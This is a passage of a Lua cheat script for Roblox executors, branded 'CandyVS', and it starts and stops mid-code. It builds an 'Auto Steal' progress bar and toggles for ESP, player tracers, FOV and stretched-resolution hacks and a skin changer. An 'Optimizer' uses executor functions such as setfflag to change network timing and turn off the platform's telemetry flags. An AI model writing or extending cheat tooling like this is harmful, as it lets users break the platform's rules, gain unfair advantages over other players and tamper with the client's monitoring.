	ColorSequenceKeypoint.new(1, Color3.fromRGB(16, 8, 4)),
	}) or ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 14, 32)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 4, 2)),
	})
	if barLabel then
	barLabel.TextColor3 = themeName == "GUI 2" and Color3.fromRGB(255, 245, 230) or Color3.fromRGB(255, 245, 250)
	barLabel.TextStrokeColor3 = themeName == "GUI 2" and Color3.fromRGB(60, 25, 5) or Color3.fromRGB(40, 10, 30)
	end
	if barPercentLabel then
	barPercentLabel.TextColor3 = themeName == "GUI 2" and Color3.fromRGB(255, 245, 230) or Color3.fromRGB(255, 245, 250)
	barPercentLabel.TextStrokeColor3 = themeName == "GUI 2" and Color3.fromRGB(60, 25, 5) or Color3.fromRGB(40, 10, 30)
	end
	end
	_G.__CandyVSApplyAutoStealBarTheme = applyAutoStealBarTheme
	applyAutoStealBarTheme(_G.__CandyVSGuiTheme or "GUI 1")

	barLabel = Instance.new("TextLabel", grabBarGui)
	barLabel.Size = UDim2.new(0, isMobile and 52 or 60, 1, -8)
	barLabel.Position = UDim2.new(0, 10, 0, 0)
	barLabel.BackgroundTransparency = 1
	barLabel.Text = "0%"
	barLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	barLabel.TextStrokeColor3 = Color3.fromRGB(40, 10, 30)
	barLabel.TextStrokeTransparency = 0.5
	barLabel.TextSize = isMobile and 16 or 18
	barLabel.Font = Enum.Font.FredokaOne
	barLabel.TextXAlignment = Enum.TextXAlignment.Left
	barLabel.TextYAlignment = Enum.TextYAlignment.Center
	barLabel.ZIndex = 503
	barLabel.Visible = true
	local barDiscord = Instance.new("TextLabel", grabBarGui)
	barDiscord.Name = "StealBarDiscord"
	barDiscord.Size = UDim2.new(1, isMobile and -160 or -190, 0, 16)
	barDiscord.Position = UDim2.new(0, isMobile and 58 or 70, 0, isMobile and 4 or 5)
	barDiscord.BackgroundTransparency = 1
	barDiscord.Text = "discord.gg/candyvs"
	barDiscord.TextColor3 = Color3.fromRGB(255, 170, 210)
	barDiscord.TextSize = isMobile and 10 or 11
	barDiscord.Font = Enum.Font.FredokaOne
	barDiscord.TextXAlignment = Enum.TextXAlignment.Center
	barDiscord.ZIndex = 503

	local statusLabel = Instance.new("TextLabel", grabBarGui)
	statusLabel.Size = UDim2.new(1, isMobile and -160 or -190, 0, 14)
	statusLabel.Position = UDim2.new(0, isMobile and 58 or 70, 0, isMobile and 18 or 20)
	statusLabel.BackgroundTransparency = 1
	statusLabel.Text = "STEAL"
	statusLabel.TextColor3 = Color3.fromRGB(200, 180, 210)
	statusLabel.TextSize = isMobile and 9 or 10
	statusLabel.Font = Enum.Font.FredokaOne
	statusLabel.TextXAlignment = Enum.TextXAlignment.Center
	statusLabel.ZIndex = 503
	statusLabel.Visible = true

	barPercentLabel = Instance.new("TextLabel", grabBarGui)
	barPercentLabel.Size = UDim2.new(0, 48, 0, 18)
	barPercentLabel.Position = UDim2.new(1, -138, 0.5, -9)
	barPercentLabel.BackgroundTransparency = 1
	barPercentLabel.Text = "0%"
	barPercentLabel.TextColor3 = Color3.fromRGB(248, 238, 255)
	barPercentLabel.TextStrokeColor3 = Color3.fromRGB(25, 4, 45)
	barPercentLabel.TextStrokeTransparency = 0.25
	barPercentLabel.TextSize = 11
	barPercentLabel.Font = Enum.Font.FredokaOne
	barPercentLabel.TextXAlignment = Enum.TextXAlignment.Right
	barPercentLabel.ZIndex = 504
	barPercentLabel.Visible = false
	local autoStealBarLockOverlay = Instance.new("TextButton", grabBarGui)
	autoStealBarLockOverlay.Name = "AutoStealUILockOverlay"
	autoStealBarLockOverlay.Size = UDim2.new(1, 0, 1, 0)
	autoStealBarLockOverlay.Position = UDim2.new(0, 0, 0, 0)
	autoStealBarLockOverlay.BackgroundTransparency = 1
	autoStealBarLockOverlay.BorderSizePixel = 0
	autoStealBarLockOverlay.Text = ""
	autoStealBarLockOverlay.TextTransparency = 1
	autoStealBarLockOverlay.TextSize = isMobile and 9 or 11
	autoStealBarLockOverlay.Font = Enum.Font.FredokaOne
	autoStealBarLockOverlay.AutoButtonColor = false
	autoStealBarLockOverlay.Visible = false
	autoStealBarLockOverlay.ZIndex = 600
	Instance.new("UICorner", autoStealBarLockOverlay).CornerRadius = UDim.new(0, 14)
	_G.__CandyVSSetAutoStealUILocked = function(locked)
		if autoStealBarLockOverlay and autoStealBarLockOverlay.Parent then
			autoStealBarLockOverlay.Visible = locked == true
		end
	end

	local autoGrabModeLabels = { v1 = "v1 · 100%", v2 = "v2 · 80%" }
	local function autoGrabModeName(mode)
	return autoGrabModeLabels[mode] or autoGrabModeLabels.v1
	end

	local titleLabel = Instance.new("TextLabel", topRow)
	titleLabel.Size = UDim2.new(0.65, 0, 1, 0)
	titleLabel.AnchorPoint = Vector2.new(0.5, 0)
	titleLabel.Position = UDim2.new(0.5, 0, 0, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = "CandyVS Auto Steal " .. autoGrabModeName(autoStealMode)
	titleLabel.TextColor3 = Color3.fromRGB(248, 238, 255)
	titleLabel.Font = Enum.Font.FredokaOne
	titleLabel.TextSize = 11
	titleLabel.TextXAlignment = Enum.TextXAlignment.Center
	titleLabel.ZIndex = 504
	titleLabel.Visible = false

	local _barDragging = false
	local _barDragStart = nil
	local _barDragInput = nil
	_G.__CandyVSGuiPositionResetters.AutoGrab = function()
	_barDragging = false
	_barDragStart = nil
	_barDragInput = nil
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	grabBarGui.Position = UDim2.new(0.5, -currentW / 2, 0.80, 0)
	_G["_CandyVS_UI_AutoGrabBarPos"] = nil
	end
	grabBarGui.InputBegan:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
	_barDragging = true
	_barDragStart = { pointer = inp.Position, position = grabBarGui.AbsolutePosition }
	if inp.UserInputType == Enum.UserInputType.Touch then _barDragInput = inp end
	end
	end)
	grabBarGui.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
	_barDragInput = inp
	end
	end)
	_G.__CandyVSTrackConn(UserInputService.InputChanged:Connect((function(inp)
	if not _barDragging or not _barDragStart or inp ~= _barDragInput then return end
	if inp.UserInputType ~= Enum.UserInputType.MouseMovement and inp.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = inp.Position - _barDragStart.pointer
	local nextX = _barDragStart.position.X + delta.X
	local nextY = _barDragStart.position.Y + delta.Y
	grabBarGui.Position = UDim2.fromOffset(nextX, nextY)
	end)))
	_G.__CandyVSTrackConn(UserInputService.InputEnded:Connect(function(inp)
	if _barDragging and (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) then
	_barDragging = false
	local absPos = grabBarGui.AbsolutePosition
	grabBarGui.AnchorPoint = Vector2.new(0, 0)
	grabBarGui.Position = UDim2.fromOffset(absPos.X, absPos.Y)
	_G["_CandyVS_UI_AutoGrabBarPos"] = { x = absPos.X, y = absPos.Y }
	_barDragStart = nil
	_barDragInput = nil
	saveConfig()
	end
	end))
	local grabBarState = {
	displayProgress = 0,
	radiusProgress = 0,
	targetInRadius = false,
	radiusCheckElapsed = 0,
	uiElapsed = 0,
	lastVisible = nil,
	lastPercent = nil,
	lastActive = nil,
	lastMode = nil,
	}
	_G.__CandyVSTrackConn(RunService.Heartbeat:Connect((function(dt)
	grabBarState.uiElapsed = grabBarState.uiElapsed + (dt or 0)
	if grabBarState.uiElapsed < (1 / 20) then return end
	dt = grabBarState.uiElapsed
	grabBarState.uiElapsed = 0
	if grabBarState.lastMode ~= autoStealMode then
	grabBarState.lastMode = autoStealMode
	titleLabel.Text = "CandyVS Auto Steal " .. autoGrabModeName(autoStealMode)
	end
	if toggleStates["auto steal"] ~= true and (v1Progress or 0) <= 0 and grabBarState.displayProgress <= 0.001 then
	if grabBarState.lastVisible ~= false then
	grabBarGui.Visible = false
	grabBarState.lastVisible = false
	end
	return
	end
	grabBarState.radiusCheckElapsed = grabBarState.radiusCheckElapsed + (dt or 0)
	local ragdollBlocked = _G.__CandyVSAutoGrabRagdollBlocked == true
	if ragdollBlocked then
	grabBarState.targetInRadius = false
	grabBarState.radiusProgress = 0
	end
	if grabBarState.radiusCheckElapsed >= 0.25 then
	grabBarState.radiusCheckElapsed = 0
	grabBarState.targetInRadius = false
	local autoGrabBusy = (StealState and StealState.active)
		or (V2 and V2.busy) or (V3New and V3New.busy)
		or (V2Grab and V2Grab.busy)
	if not ragdollBlocked and not autoGrabBusy and toggleStates["auto steal"] == true and _G.__CandyVSAutoGrabTargetInRadius then
	local activeRadius = math.clamp(tonumber(autoStealValues.Radius) or 65, 10, 150)
	local ok, inRange = pcall(_G.__CandyVSAutoGrabTargetInRadius, activeRadius)
	grabBarState.targetInRadius = ok and inRange == true
	end
	end

	local actualProgress = ragdollBlocked and 0 or math.clamp(v1Progress or 0, 0, 1)
	if grabBarState.targetInRadius then
	if actualProgress > 0 then
	grabBarState.radiusProgress = actualProgress
	else
	local fillDuration = math.max(0.1, tonumber(autoStealValues.Duration) or 1.3)
	grabBarState.radiusProgress = grabBarState.radiusProgress + (dt or 0) / fillDuration
	if grabBarState.radiusProgress >= 1 then grabBarState.radiusProgress = 0 end
	end
	else
	grabBarState.radiusProgress = 0
	end

	local progress = math.max(actualProgress, grabBarState.radiusProgress)
	local totalW = barBg.AbsoluteSize.X
	if totalW <= 0 then totalW = grabBarGui.AbsoluteSize.X - (isMobile and 76 or 88) end
	if totalW <= 0 then totalW = isMobile and 192 or 222 end
	local targetW = math.clamp(progress * totalW, 0, totalW)
	local currentW = grabBarState.displayProgress * totalW
	local lerpSpeed = progress > grabBarState.displayProgress and 18 or 22
	currentW = currentW + (targetW - currentW) * math.min(lerpSpeed * dt, 1)
	if math.abs(currentW - targetW) < 0.5 then currentW = targetW end
	grabBarState.displayProgress = totalW > 0 and math.clamp(currentW / totalW, 0, 1) or 0
	barFill.Size = UDim2.new(0, currentW, 1, 0)

	local shouldShowGrab = (toggleStates["auto steal"] == true) or (progress > 0)
	if shouldShowGrab ~= grabBarState.lastVisible then
	grabBarGui.Visible = shouldShowGrab
	grabBarState.lastVisible = shouldShowGrab
	end
	do
	local pct = math.floor(progress * 100)
	pct = math.clamp(pct, 0, 100)
	if pct ~= grabBarState.lastPercent then
	percentLabel.Text = tostring(pct) .. "%"
	barPercentLabel.Text = tostring(pct) .. "%"
	barLabel.Text = tostring(pct) .. "%"
	grabBarState.lastPercent = pct
	end
	end
	local grabIsActive = progress > 0
	if grabIsActive and grabBarState.lastActive ~= true then
	barFill.BackgroundColor3 = barThemeColor
	barStrokeInst.Color = Color3.fromRGB(92, 94, 100)
	barStrokeInst.Transparency = 0.08
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	end
	grabBarState.lastActive = grabIsActive
	end)))
	end

	local visualSection = makeUraniumSection(tabPages.Visuals, "VISUALS")
	makeToggleNoKeybind(visualSection, "anti lag", "Anti Lag")
	_G.__visualSection = visualSection
	makeToggleNoKeybind(visualSection, "ESP Players", "ESP Players")
	makeToggleNoKeybind(visualSection, "Player Tracers", "Player Tracers")

	local optimizerMode = "Ultra"
	local optimizerModeRefreshers = {}
	local applySky
	local skyCurrentMode
	local function refreshOptimizerModeUI()
	for _, refresh in ipairs(optimizerModeRefreshers) do pcall(refresh, optimizerMode) end
	end
	local function setOptimizerMode(mode)
	if mode ~= "Normal" and mode ~= "Ultra" then mode = "Normal" end
	optimizerMode = mode
	_G.__optimizerMode = mode
	refreshOptimizerModeUI()
	pcall(saveConfig)
	if toggleStates["Optimizer"] and FeaturePostToggle["Optimizer"] then
	FeaturePostToggle["Optimizer"](false)
	FeaturePostToggle["Optimizer"](true)
	end
	end
	if _G.__optimizerMode == "Normal" or _G.__optimizerMode == "Ultra" then
	optimizerMode = _G.__optimizerMode
	else
	_G.__optimizerMode = optimizerMode
	end

	do
	local optimizerRow = makeToggleNoKeybind(visualSection, "Optimizer", "Optimizer")
	local optimizerCard = nil
	for _, child in ipairs(optimizerRow:GetChildren()) do
	if child:IsA("TextButton") then optimizerCard = child; break end
	end
	if optimizerCard then
	local modeBtn = Instance.new("TextButton", optimizerCard)
	modeBtn.Size = UDim2.new(0, 66, 0, 20)
	modeBtn.Position = UDim2.new(1, -74, 0.5, -10)
	modeBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	modeBtn.BorderSizePixel = 0
	modeBtn.TextColor3 = Color3.fromRGB(225, 238, 255)
	modeBtn.TextSize = 10
	modeBtn.Font = Enum.Font.FredokaOne
	modeBtn.AutoButtonColor = false
	modeBtn.ZIndex = 10
	Instance.new("UICorner", modeBtn).CornerRadius = UDim.new(0, 4)
	local modeStroke = Instance.new("UIStroke", modeBtn)
	modeStroke.Color = Color3.fromRGB(255, 255, 255)
	modeStroke.Thickness = 1
	modeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function refreshMode() modeBtn.Text = string.upper(optimizerMode) end
	table.insert(optimizerModeRefreshers, refreshMode)
	connectBtn(modeBtn, function()
	setOptimizerMode(optimizerMode == "Normal" and "Ultra" or "Normal")
	refreshMode()
	end)
	refreshMode()
	end
	end

	do
	local optimizerActive = false
	local optimizerConn = nil
	local optimizerLightingConn = nil
	local optimizerCharConn = nil
	local optimizerWalkCancel = nil
	local defLightBrightness, defLightClock, defLightAmbient
	local removeAccessoriesEnabled = false
	local lowHarshUntil = 0
	local lowFlagGeneration = 0
	local optimizerUltraOriginals = {}

	local function rememberUltraState(obj, state)
	if optimizerUltraOriginals[obj] == nil then optimizerUltraOriginals[obj] = state end
	end

	local function restoreUltraState()
	for obj, original in pairs(optimizerUltraOriginals) do
	pcall(function()
	if original.Parent ~= nil and obj.Parent == nil and original.Parent.Parent ~= nil then
	obj.Parent = original.Parent
	end
	if obj.Parent ~= nil then
	if original.Material ~= nil then obj.Material = original.Material end
	if original.Reflectance ~= nil then obj.Reflectance = original.Reflectance end
	if original.CastShadow ~= nil then obj.CastShadow = original.CastShadow end
	if original.Transparency ~= nil then obj.Transparency = original.Transparency end
	if original.Enabled ~= nil then obj.Enabled = original.Enabled end
	end
	end)
	end
	optimizerUltraOriginals = {}
	end

	local lowFlags = {
	{"DFIntClusterSenderMaxJoinBandwidthBps", "2100000000"},
	{"DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000"},
	{"DFIntServerFramesBetweenJoins", "1"},
	{"DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000"},
	{"DFIntConnectionMTUSize", "1400"},
	{"FIntRakNetResendBufferArrayLength", "1024"},
	{"DFIntRakNetNakResendDelayMsMax", "1"},
	{"DFIntWaitOnUpdateNetworkLoopEndedMS", "100"},
	{"DFIntWaitOnRecvFromLoopEndedMS", "100"},
	{"DFIntLargePacketQueueSizeCutoffMB", "1000"},
	{"DFIntSendRakNetStatsInterval", "2147483647"},
	{"DFIntRakNetLoopMs", "1"},
	{"DFIntRakNetSelectTimeoutMs", "1"},
	{"DFIntNetworkClusterPacketCacheNumParallelTasks", "8"},
	{"DFIntReplicationDataCacheNumParallelTasks", "8"},
	{"DFIntMegaReplicatorNumParallelTasks", "16"},
	{"DFIntMegaReplicatorNetworkQualityProcessorUnit", "10"},
	{"DFIntMaxProcessPacketsStepsPerCyclic", "512"},
	{"DFIntMaxProcessPacketsStepsAccumulated", "0"},
	{"DFIntMaxProcessPacketsJobScaling", "1000"},
	{"DFIntClientPacketMaxFrameMicroseconds", "200000"},
	{"DFIntClientPacketExcessMicroseconds", "10000"},
	{"DFIntClientPacketMinMicroseconds", "1"},
	{"DFIntClientPacketMaxDelayMs", "1"},
	{"DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1"},
	{"DFIntMaxFrameBufferSize", "4"},
	{"DFIntBufferCompressionThreshold", "100"},
	{"DFIntOverrideISRReplicatorStepBandwidthBytes", "131072"},
	{"DFIntTaskSchedulerJobInitThreads", "8"},
	{"DFIntTaskSchedulerJobInGameThreads", "8"},
	{"FIntTaskSchedulerAutoThreadLimit", "16"},
	{"FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4"},
	{"DFIntRuntimeConcurrency", "16"},
	{"FIntSimWorldTaskQueueParallelTasks", "20"},
	{"DFIntHttpBatchLimit", "256"},
	{"FIntHttpBatchLimit", "256"},
	{"DFIntHttpCurlConnectionCacheSize", "512"},
	{"FIntDefaultMeshCacheSizeMB", "512"},
	{"DFIntMemCacheMaxCapacityMB", "256"},
	{"DFIntNumAssetsMaxToPreload", "1"},
	{"DFFlagEnableSoundPreloading", "false"},
	{"FFlagSlimContentProvider", "true"},
	{"DFFlagDebugSkipMeshVoxelizer", "true"},
	{"DFFlagTextureQualityOverrideEnabled", "true"},
	{"DFIntTextureQualityOverride", "0"},
	{"FIntDebugTextureManagerSkipMips", "7"},
	{"DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8"},
	{"FFlagTM2SkipMipsForUnstreamable2", "true"},
	{"DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true"},
	{"FFlagRenderUseTextureManager224", "false"},
	{"DFIntDebugFRMQualityLevelOverride", "1"},
	{"DFFlagDebugPauseVoxelizer", "true"},
	{"FFlagFastGPULightCulling3", "true"},
	{"FIntRenderLocalLightFadeInMs", "0"},
	{"FIntRenderLocalLightUpdatesMax", "1"},
	{"FIntRenderShadowmapBias", "0"},
	{"FIntSSAOMipLevels", "0"},
	{"FIntDebugForceMSAASamples", "1"},
	{"FIntDebugFRMOptionalMSAALevelOverride", "0"},
	{"FIntRobloxGuiBlurIntensity", "0"},
	{"FIntFRMMinGrassDistance", "0"},
	{"FIntFRMMaxGrassDistance", "0"},
	{"DFFlagCoreScriptTelemetry2", "false"},
	{"DFFlagBrowserTrackerIdTelemetryEnabled", "false"},
	{"FFlagPerfDataOnTelemetryV2", "false"},
	{"FFlagSendRenderFidelityTelemetry2", "false"},
	{"FFlagEnableTelemetryServiceMemoryCPUInfo", "false"},
	{"DFIntTelemetryProfilerHundredthsPercentage", "0"},
	{"FIntTelemetryProfilerFrequency", "0"},
	{"FIntPerformanceTelemetryQueueProcessLimit", "0"},
	{"DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0"},
	}

	local function applyLowFlags()
	local env = (getgenv and getgenv()) or _G
	local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
	local getter = rawget(env, "getfflag") or rawget(_G, "get_fflag")
	if type(setter) ~= "function" then return end
	for _, flag in ipairs(lowFlags) do
	local canSet = true
	if type(getter) == "function" then
	local ok, current = pcall(getter, flag[1])
	canSet = ok and current ~= nil
	end
	if canSet then pcall(setter, flag[1], tostring(flag[2])) end
	end
	end

	local function applyLowPermanentSettings()
	pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
	pcall(function()
	UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
	end)
	pcall(function()
	Lighting.GlobalShadows = false
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	end)
	pcall(function()
	local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
	if atmosphere then
	atmosphere.Density = 0
	atmosphere.Glare = 0
	atmosphere.Haze = 0
	end
	end)
	pcall(function()
	local terrain = workspace:FindFirstChildOfClass("Terrain")
	if terrain then
	terrain.Decoration = false
	terrain.WaterWaveSize = 0
	terrain.WaterWaveSpeed = 0
	terrain.WaterReflectance = 0
	local clouds = terrain:FindFirstChildOfClass("Clouds")
	if clouds then clouds.Enabled = false end
	end
	end)
	end

	local applyOptimizerDerender = (function(obj)
	pcall(function()
	if _G.__CandyVSPreserveOptimizerUI(obj) then return end
	if optimizerMode ~= "Ultra" then
	if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke")
	or obj:IsA("Fire") or obj:IsA("Sparkles") or obj:IsA("PostEffect") then
	obj.Enabled = false
	end
	if tick() <= lowHarshUntil then
	if obj:IsA("Decal") or obj:IsA("Texture") then
	obj.Transparency = 1
	end
	end
	return
	end
	local objName = obj.Name or ""
	local parentName = (obj.Parent and obj.Parent.Name) or ""
	local grandParentName = (obj.Parent and obj.Parent.Parent and obj.Parent.Parent.Name) or ""
	if string.find(objName, "SkinChanger_") or string.find(parentName, "SkinChanger_")
	or string.find(grandParentName, "SkinChanger_") then return end
	if obj:IsA("Accessory") or obj:IsA("Hat") or obj:IsA("Clothing")
	or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("ShirtGraphic") then
	rememberUltraState(obj, {Parent = obj.Parent})
	obj.Parent = nil
	elseif obj:IsA("BasePart") then
	rememberUltraState(obj, {
	Material = obj.Material,
	Reflectance = obj.Reflectance,
	CastShadow = obj.CastShadow,
	})
	obj.Material = Enum.Material.Plastic
	obj.Reflectance = 0
	obj.CastShadow = false
	elseif obj:IsA("Decal") or obj:IsA("Texture") then
	rememberUltraState(obj, {Transparency = obj.Transparency})
	obj.Transparency = 1
	elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
	or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
	rememberUltraState(obj, {Enabled = obj.Enabled})
	obj.Enabled = false
	elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
	for _, track in ipairs(obj:GetPlayingAnimationTracks()) do
	pcall(function() track:Stop(0) end)
	end
	end
	end)
	end)

	local processAllDescendants = (function()
	local roots = optimizerMode == "Ultra" and {workspace} or {workspace, Lighting}
	if optimizerWalkCancel then optimizerWalkCancel() end
	optimizerWalkCancel = _G.__CandyVSWalkDescendantsBatched(roots, applyOptimizerDerender, function()
	return optimizerActive
	end)
	end)

	local function applyOptimizerLighting()
	defLightBrightness = defLightBrightness or Lighting.Brightness
	defLightClock = defLightClock or Lighting.ClockTime
	defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient
	if optimizerMode ~= "Ultra" then
	applyLowPermanentSettings()
	return
	end
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 1e10
	Lighting.Brightness = 1
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	for _, effect in ipairs(Lighting:GetChildren()) do
	pcall(function()
	if effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect")
	or effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect")
	or effect:IsA("DepthOfFieldEffect") then effect.Enabled = false end
	end)
	end
	end

	local function resetOptimizerLighting()
	pcall(function()
	if defLightBrightness then Lighting.Brightness = defLightBrightness end
	if defLightClock then Lighting.ClockTime = defLightClock end
	if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end
	Lighting.ExposureCompensation = 0
	Lighting.GlobalShadows = true
	Lighting.FogEnd = 100000
	Lighting.EnvironmentDiffuseScale = 1
	Lighting.EnvironmentSpecularScale = 1
	end)
	end

	FeaturePostToggle["Optimizer"] = function(active)
	if active then
	if optimizerActive then return end

	removeAccessoriesEnabled = true
	optimizerActive = true
	if optimizerMode ~= "Ultra" then
	lowHarshUntil = tick() + 1
	lowFlagGeneration = lowFlagGeneration + 1
	local generation = lowFlagGeneration
	applyLowFlags()
	for _, delaySeconds in ipairs({2, 6, 12, 20}) do
	task.delay(delaySeconds, function()
	if optimizerActive and optimizerMode ~= "Ultra" and generation == lowFlagGeneration then
	applyLowFlags()
	end
	end)
	end
	pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)
	end
	applyOptimizerLighting()
	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	end
	processAllDescendants()

	if optimizerConn then optimizerConn:Disconnect() end
optimizerConn = workspace.DescendantAdded:Connect(function(obj)
if removeAccessoriesEnabled then
applyOptimizerDerender(obj)
end
end)
	if optimizerLightingConn then optimizerLightingConn:Disconnect() end
	optimizerLightingConn = Lighting.DescendantAdded:Connect(function(obj)
	if removeAccessoriesEnabled then applyOptimizerDerender(obj) end
	end)

	if optimizerCharConn then optimizerCharConn:Disconnect() end
	optimizerCharConn = Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	_G.__CandyVSWalkDescendantsBatched(char, applyOptimizerDerender, function() return optimizerActive end)
	end)

	print("[Optimizer] Anti Lag ACTIVADO - Modo " .. optimizerMode)
	else
	if not optimizerActive then return end

	removeAccessoriesEnabled = false
	optimizerActive = false
	if optimizerWalkCancel then optimizerWalkCancel(); optimizerWalkCancel = nil end
	lowFlagGeneration = lowFlagGeneration + 1
	restoreUltraState()

	if optimizerConn then
	optimizerConn:Disconnect()
	optimizerConn = nil
	end
	if optimizerLightingConn then
	optimizerLightingConn:Disconnect()
	optimizerLightingConn = nil
	end

	if optimizerCharConn then
	optimizerCharConn:Disconnect()
	optimizerCharConn = nil
	end

	if toggleStates["Sky Changer"] then
	applySky(skyCurrentMode)
	else
	resetOptimizerLighting()
	end
	print("[Optimizer] Anti Lag DESACTIVADO")
end
end
end
_G.__CandyVSTrackStopper(function()
if optimizerActive and FeaturePostToggle["Optimizer"] then FeaturePostToggle["Optimizer"](false) end
end)

	makeToggleWithInput(visualSection, "FOV", "Custom FOV", "FOV",
	function(v) return tostring(v) end,
	function(n) return math.clamp(math.floor(n+0.5), 30, 120) end
	)

	do
	local fovActive = false
	local fovConn = nil
	local defaultFOV = 90
	local originalFOV = nil

	local function enableFOV()
	if fovActive then return end
	fovActive = true
	toggleStates["Custom FOV"] = true
	if fovConn then fovConn:Disconnect() end
	local cam = workspace.CurrentCamera
	if cam and originalFOV == nil then originalFOV = cam.FieldOfView end
	fovConn = RunService.RenderStepped:Connect((function()
	if not fovActive then return end
	local activeCamera = workspace.CurrentCamera
	local desiredFOV = speedValues.FOV or 90
	if activeCamera and math.abs(activeCamera.FieldOfView - desiredFOV) > 0.01 then
	activeCamera.FieldOfView = desiredFOV
	end
	end))
	if cam then cam.FieldOfView = speedValues.FOV or 90 end
	task.defer(saveConfig)
	end

	local function disableFOV()
	if not fovActive then return end
	fovActive = false
	toggleStates["Custom FOV"] = false
	if fovConn then
	fovConn:Disconnect()
	fovConn = nil
	end
	local cam = workspace.CurrentCamera
	if cam then cam.FieldOfView = originalFOV or defaultFOV end
	originalFOV = nil
	task.defer(saveConfig)
	end

	FeaturePostToggle["Custom FOV"] = function(active)
	if active then enableFOV() else disableFOV() end
	end
	_G.__CandyVSTrackStopper(disableFOV)

	if toggleStates["Custom FOV"] then task.defer(enableFOV) end
	end

	makeToggleNoKeybind(visualSection, "Stretchz Res", "Stretchz Res")
	do
	local stretchRezEnabled = false
	local stretchRezConn = nil
	local STRETCH_FOV = 90
	local DEFAULT_FOV = 90

	local function applyStretchFOV(val)
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.FieldOfView = val end)
	end
	end

	local function enableStretchRez()
	if stretchRezEnabled then return end
	stretchRezEnabled = true
	toggleStates["Stretchz Res"] = true

	local cam = workspace.CurrentCamera
	if not cam then return end

	if stretchRezConn then stretchRezConn:Disconnect() end
	stretchRezConn = RunService.RenderStepped:Connect((function()
	if not stretchRezEnabled then return end
	applyStretchFOV(STRETCH_FOV)
	pcall(function()
	cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.7, 0, 0, 0, 1)
	end)
	end))

	applyStretchFOV(STRETCH_FOV)
	task.defer(saveConfig)
	end

	local function disableStretchRez()
	stretchRezEnabled = false
	toggleStates["Stretchz Res"] = false
	if stretchRezConn then
	stretchRezConn:Disconnect()
	stretchRezConn = nil
	end
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.FieldOfView = DEFAULT_FOV end)
	end
	task.defer(saveConfig)
	end

	FeaturePostToggle["Stretchz Res"] = function(active)
	if active then enableStretchRez() else disableStretchRez() end
	end
	_G.__CandyVSTrackStopper(disableStretchRez)

	if toggleStates["Stretchz Res"] then task.defer(enableStretchRez) end
	end


	do
	local skinState = _G.__CandyVSSkinChangerState
	if type(skinState) ~= "table" or skinState.version ~= 2 then
		if type(skinState) == "table" and Player.Character then
			local oldDescription = skinState.originals and skinState.originals[Player.Character]
			local oldHumanoid = Player.Character:FindFirstChildOfClass("Humanoid")
			if typeof(oldDescription) == "Instance" and oldHumanoid then
				pcall(function() oldHumanoid:ApplyDescription(oldDescription:Clone()) end)
			end
		end
		skinState = {version = 2, originals = setmetatable({}, {__mode = "k"}), templates = {}}
		_G.__CandyVSSkinChangerState = skinState
	end
	skinState.isHair = function(item)
		if not item:IsA("Accessory") then return false end
		local ok, isHair = pcall(function() return item.AccessoryType == Enum.AccessoryType.Hair end)
		return (ok and isHair) or item:FindFirstChild("HairAttachment", true) ~= nil
	end
	skinState.resolveTemplate = function(assetId, className, propertyName)
		local key = className .. ":" .. tostring(assetId)
		if skinState.templates[key] then return skinState.templates[key] end
		local template = "rbxassetid://" .. tostring(assetId)
		local ok, objects = pcall(function() return game:GetObjects(template) end)
		if ok and objects and objects[1] then
			local root = objects[1]
			local clothing = root:IsA(className) and root or root:FindFirstChildWhichIsA(className, true)
			if clothing and clothing[propertyName] ~= "" then template = clothing[propertyName] end
			pcall(function() root:Destroy() end)
		end
		skinState.templates[key] = template
		return template
	end
	skinState.removeChanged = function(character)
		for _, item in ipairs(character:GetChildren()) do
			if item:IsA("Shirt") or item:IsA("Pants") or item.Name == "CandyVSSkinChanger_Hair" or skinState.isHair(item) then
				pcall(function() item:Destroy() end)
			end
		end
	end
	skinState.capture = function(character)
		if skinState.originals[character] then return end
		local original = {items = {}}
		for _, item in ipairs(character:GetChildren()) do
